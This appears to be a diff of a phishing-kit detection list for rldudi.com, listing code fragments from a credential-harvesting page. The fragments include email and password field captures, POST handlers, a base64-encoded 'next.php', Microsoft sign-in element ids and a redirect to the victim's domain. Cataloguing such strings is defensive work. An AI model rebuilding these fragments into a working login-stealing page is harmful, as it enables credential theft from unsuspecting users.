@@ -13,25 +13,27 @@ rldudi.com
 #------------------------------------------------------------------------------------------------------------------------
 #                                                Associated Kit Functions
 #------------------------------------------------------------------------------------------------------------------------
-my_ai
-c = my_slice
+$header = "Content type: xeuztech \r\n"
 !base64regex.test(ai))
+c = my_slice
 file="bmV4dC5waHA="
-var file = "bmV4dC5waHA="
+id="authOptionLinks"
+id="authOptions"
+id="emailIntroduction"
+id="kmsiArea"
+id="kmsiInput"
+if (!filter.test(my_ai))
+my_ai
 trim($_POST['ai'])
-var ai = $("#ai").val()
 trim($_POST['pr'])
-var pr = $("#pr").val()
-var ind=my_email.indexOf("@")
-var my_slice=my_email.substr((ind+1))
+var ai = $("#ai").val()
 var c= my_slice.substr(0, my_slice.indexOf('.'))
 var email=$("#email").val()
-var password=$("#password").val()
+var file = "bmV4dC5waHA="
+var ind=my_email.indexOf("@")
 var msg = $('#msg').html()
+var my_slice=my_email.substr((ind+1))
+var password=$("#password").val()
+var pr = $("#pr").val()
 window.location.replace("http://www."+my_slice)
-$header = "Content type: xeuztech \r\n"
-if (!filter.test(my_ai))
-#------------------------------------------------------------------------------------------------------------------------
-#                                                Misc. Items
-#------------------------------------------------------------------------------------------------------------------------
 #------------------------------------------------------------------------------------------------------------------------
